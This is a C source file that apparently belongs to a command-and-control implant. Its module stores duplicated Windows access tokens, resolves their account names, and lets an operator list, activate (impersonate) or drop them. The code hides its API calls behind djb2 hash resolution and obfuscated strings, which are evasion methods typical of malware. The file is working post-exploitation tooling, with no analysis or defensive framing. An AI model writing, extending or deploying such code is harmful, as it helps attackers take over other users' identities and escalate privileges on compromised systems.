#include "config.h"
#ifdef INCLUDE_CMD_TOKEN_STORE

#include "commands.h"
#include "common.h"

typedef BOOL (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);
typedef BOOL (WINAPI *fn_RevertToSelf)(void);
typedef BOOL (WINAPI *fn_GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL (WINAPI *fn_LookupAccountSidA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);

#define TOKEN_DUPLICATE          0x0002
#define TOKEN_QUERY              0x0008
#define TOKEN_IMPERSONATE        0x0004
#define TOKEN_ASSIGN_PRIMARY     0x0001
#define TOKEN_ALL_ACCESS_ES      0x000F01FF
#define SecurityImpersonation    2
#define SecurityDelegation       3
#define TOKEN_TYPE_IMPERSONATION 2
#define TOKEN_TYPE_PRIMARY       1

// Find the next free slot in the token store; returns -1 if full
static int _find_free_slot(PINSTANCE inst) {
    for (int i = 0; i < ES_TOKEN_STORE_SLOTS; i++) {
        if (!inst->TokenStore[i].token)
            return i;
    }
    return -1;
}

// Store a token in the next free slot with username lookup
int token_store_add(PINSTANCE inst, HANDLE token, DWORD pid) {
    int slot = _find_free_slot(inst);
    if (slot < 0) return -1;

    // Duplicate the token so the caller can close the original independently
    fn_DuplicateTokenEx pDuplicateTokenEx = NULL;
    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    if (h_adv) {
        pDuplicateTokenEx = (fn_DuplicateTokenEx)resolve_function(
            (PVOID)h_adv, hash_string_djb2(XSTR("DuplicateTokenEx")));
    }

    HANDLE h_stored = NULL;
    if (pDuplicateTokenEx) {
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        if (!pDuplicateTokenEx(token,
                TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                &sa, SecurityImpersonation, TOKEN_TYPE_IMPERSONATION, &h_stored)) {
            // fall back to storing the original handle
            h_stored = token;
        }
    } else {
        h_stored = token;
    }

    inst->TokenStore[slot].token = h_stored;
    inst->TokenStore[slot].pid = pid;
    inst->TokenStore[slot].active = FALSE;
    es_memset(inst->TokenStore[slot].username, 0, sizeof(inst->TokenStore[slot].username));

    // Resolve username from token
    if (h_adv) {
        fn_GetTokenInformation pGetTokenInfo = (fn_GetTokenInformation)resolve_function(
            (PVOID)h_adv, hash_string_djb2(XSTR("GetTokenInformation")));
        fn_LookupAccountSidA pLookup = (fn_LookupAccountSidA)resolve_function(
            (PVOID)h_adv, hash_string_djb2(XSTR("LookupAccountSidA")));
        if (pGetTokenInfo && pLookup) {
            BYTE buf[256] = {0};
            DWORD needed = 0;
            // TokenUser = 1
            if (pGetTokenInfo(h_stored, (TOKEN_INFORMATION_CLASS)1, buf, sizeof(buf), &needed)) {
                // TOKEN_USER: first field is SID pointer
                PSID sid = ((TOKEN_USER*)buf)->User.Sid;
                char name[64] = {0};
                DWORD name_len = sizeof(name);
                char dom[64] = {0};
                DWORD dom_len = sizeof(dom);
                SID_NAME_USE use;
                if (pLookup(NULL, sid, name, &name_len, dom, &dom_len, &use)) {
                    DWORD pos = 0;
                    for (DWORD i = 0; dom[i] && pos < 120; i++)
                        inst->TokenStore[slot].username[pos++] = dom[i];
                    if (pos > 0 && pos < 126)
                        inst->TokenStore[slot].username[pos++] = '\\';
                    for (DWORD i = 0; name[i] && pos < 127; i++)
                        inst->TokenStore[slot].username[pos++] = name[i];
                }
            }
        }
    }

    return slot;
}

// token_store: list | use <id> | remove <id>
VOID cmd_token_store(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD action_len = 0;
    char* action = parser_string(args, &action_len);
    if (!action || action_len == 0) {
        package_add_string(inst, response, XSTR("Usage: token_store list|use|remove [id]"));
        response->is_error = TRUE;
        return;
    }

    // list
    if (es_strcmp(action, XSTR("list")) == 0) {
        char line[256];
        BOOL found = FALSE;
        package_add_string(inst, response, XSTR("ID\tUser\tPID\tActive\n"));
        for (int i = 0; i < ES_TOKEN_STORE_SLOTS; i++) {
            if (!inst->TokenStore[i].token) continue;
            found = TRUE;
            // Format: "id\tuser\tpid\tactive\n"
            char num[12] = {0};
            // int to string
            int idx = 0;
            int val = i;
            if (val == 0) { num[idx++] = '0'; }
            else {
                char tmp[12];
                int t = 0;
                while (val > 0) { tmp[t++] = '0' + (val % 10); val /= 10; }
                for (int j = t - 1; j >= 0; j--) num[idx++] = tmp[j];
            }
            char pid_str[12] = {0};
            int pi = 0;
            DWORD pv = inst->TokenStore[i].pid;
            if (pv == 0) { pid_str[pi++] = '0'; }
            else {
                char tmp2[12];
                int t2 = 0;
                while (pv > 0) { tmp2[t2++] = '0' + (pv % 10); pv /= 10; }
                for (int j = t2 - 1; j >= 0; j--) pid_str[pi++] = tmp2[j];
            }

            es_memset(line, 0, sizeof(line));
            DWORD pos = 0;
            for (int j = 0; num[j] && pos < 250; j++) line[pos++] = num[j];
            line[pos++] = '\t';
            for (int j = 0; inst->TokenStore[i].username[j] && pos < 250; j++)
                line[pos++] = inst->TokenStore[i].username[j];
            line[pos++] = '\t';
            for (int j = 0; pid_str[j] && pos < 250; j++) line[pos++] = pid_str[j];
            line[pos++] = '\t';
            if (inst->TokenStore[i].active) {
                line[pos++] = '*';
            } else {
                line[pos++] = '-';
            }
            line[pos++] = '\n';
            line[pos] = '\0';
            package_add_string(inst, response, line);
        }
        if (!found) {
            package_add_string(inst, response, XSTR("(empty)"));
        }
        return;
    }

    // use <id>
    if (es_strcmp(action, XSTR("use")) == 0) {
        DWORD id = parser_int32(args);
        if (id >= ES_TOKEN_STORE_SLOTS || !inst->TokenStore[id].token) {
            package_add_string(inst, response, XSTR("Invalid slot or empty"));
            response->is_error = TRUE;
            return;
        }

        xstr(_adv, "advapi32.dll");
        HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
        if (!h_adv) {
            package_add_string(inst, response, XSTR("advapi32 load failed"));
            response->is_error = TRUE;
            return;
        }

        fn_DuplicateTokenEx pDupToken = (fn_DuplicateTokenEx)resolve_function(
            (PVOID)h_adv, hash_string_djb2(XSTR("DuplicateTokenEx")));
        fn_ImpersonateLoggedOnUser pImpersonate = (fn_ImpersonateLoggedOnUser)resolve_function(
            (PVOID)h_adv, hash_string_djb2(XSTR("ImpersonateLoggedOnUser")));
        if (!pDupToken || !pImpersonate) {
            package_add_string(inst, response, XSTR("API resolve failed"));
            response->is_error = TRUE;
            return;
        }

        // Duplicate to impersonation token
        HANDLE h_imp = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        if (!pDupToken(inst->TokenStore[id].token,
                TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                &sa, SecurityImpersonation, TOKEN_TYPE_IMPERSONATION, &h_imp)) {
            package_add_string(inst, response, XSTR("DuplicateTokenEx (impersonation) failed"));
            response->is_error = TRUE;
            return;
        }

        if (!pImpersonate(h_imp)) {
            gate_CloseHandle(inst, h_imp);
            package_add_string(inst, response, XSTR("ImpersonateLoggedOnUser failed"));
            response->is_error = TRUE;
            return;
        }

        // Close previous impersonation token
        if (inst->ImpersonationToken)
            gate_CloseHandle(inst, inst->ImpersonationToken);
        inst->ImpersonationToken = h_imp;

        // Clear old active flag, set new
        for (int i = 0; i < ES_TOKEN_STORE_SLOTS; i++)
            inst->TokenStore[i].active = FALSE;
        inst->TokenStore[id].active = TRUE;
        inst->ActiveTokenSlot = (int)id;

        package_add_string(inst, response, XSTR("Token activated"));
        return;
    }

    // remove <id>
    if (es_strcmp(action, XSTR("remove")) == 0) {
        DWORD id = parser_int32(args);
        if (id >= ES_TOKEN_STORE_SLOTS || !inst->TokenStore[id].token) {
            package_add_string(inst, response, XSTR("Invalid slot or empty"));
            response->is_error = TRUE;
            return;
        }

        BOOL was_active = inst->TokenStore[id].active;
        gate_CloseHandle(inst, inst->TokenStore[id].token);
        inst->TokenStore[id].token = NULL;
        inst->TokenStore[id].pid = 0;
        inst->TokenStore[id].active = FALSE;
        es_memset(inst->TokenStore[id].username, 0, sizeof(inst->TokenStore[id].username));

        // If this was the active token, revert to self
        if (was_active) {
            xstr(_adv, "advapi32.dll");
            HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
            if (h_adv) {
                fn_RevertToSelf pRevert = (fn_RevertToSelf)resolve_function(
                    (PVOID)h_adv, hash_string_djb2(XSTR("RevertToSelf")));
                if (pRevert) pRevert();
            }
            if (inst->ImpersonationToken) {
                gate_CloseHandle(inst, inst->ImpersonationToken);
                inst->ImpersonationToken = NULL;
            }
            inst->ActiveTokenSlot = -1;
        }

        package_add_string(inst, response, XSTR("Token removed"));
        return;
    }

    package_add_string(inst, response, XSTR("Unknown action. Use: list, use, remove"));
    response->is_error = TRUE;
}

#endif
